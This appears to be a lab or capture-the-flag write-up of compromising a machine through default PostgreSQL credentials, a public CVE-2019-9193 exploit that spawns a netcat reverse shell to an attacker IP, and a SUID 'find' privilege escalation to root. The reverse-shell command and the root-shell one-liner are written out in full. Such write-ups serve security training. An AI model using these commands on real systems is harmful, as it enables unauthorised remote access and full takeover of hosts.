Local#

The PostgresSQL service on port 5437 has default credentials set:

postgres:postgres

I found out that the version 11.7 is vulnerable to CVE-2019-9193 which is an authenticated RCE for which i found this public exploit.

I used the following command to receive a reverse shell as user postgres on the target:

└─$ python3 cve-2019-9193.py -i 192.168.120.47 -p 5437 -U postgres -P postgres -c 'busybox nc 192.168.45.198 80 -e /bin/bash'

We have read privileges on the home directory of wilson so we can read /home/wilson/local.txt.

Proof#

By analysing the output of $ find / -perm -u=s -type f 2>/dev/null we can see that the SUID bit for /usr/bin/find is set:

If we search for this binary in GTFOBins we can find the following command for escalating to a root shell when SUID is set:

$ find . -exec /bin/sh -p \; -quit

It worked and I was able to read /root/proof.txt
